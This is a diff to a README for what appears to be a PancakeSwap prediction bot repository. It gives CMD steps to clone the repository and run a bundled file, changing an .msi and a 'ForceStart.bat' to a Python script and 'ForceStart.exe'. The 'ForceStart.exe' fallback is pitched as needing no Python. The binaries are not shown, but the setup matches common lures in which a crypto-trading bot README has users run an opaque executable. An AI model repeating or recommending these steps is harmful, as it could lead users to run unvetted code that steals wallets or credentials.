@@ -52,20 +52,23 @@ With these updates, our goal is to provide a safer, more flexible, and user-cent
 Download and Install Git here:
 [Git](https://git-scm.com/download/win)
 
+Download and Install Python here:
+[Python 3.12.1](https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe)
+
 Then run the following commands in CMD:
 
 ```shell
 git clone https://github.com/SilviaKadeh/pancake-predict-bot-UI-Supported
 cd pancake-predict-bot-UI-Supported
-"PancakeswapPredictBot V8.4.1.msi"
+"python3 uistarter.py"
 ```
 
-If you experience errors while the bot is running, you can apply the force start option below:
+If you experience errors while the bot is running, you can apply the force start option below(You do not need to install Python for this option.):
 
 ```shell
 git clone https://github.com/SilviaKadeh/pancake-predict-bot-UI-Supported
 cd pancake-predict-bot-UI-Supported
-"ForceStart.bat"
+"ForceStart.exe"
 ```
 
 ## 🐰⚡ Installation on Terminal - MacOs
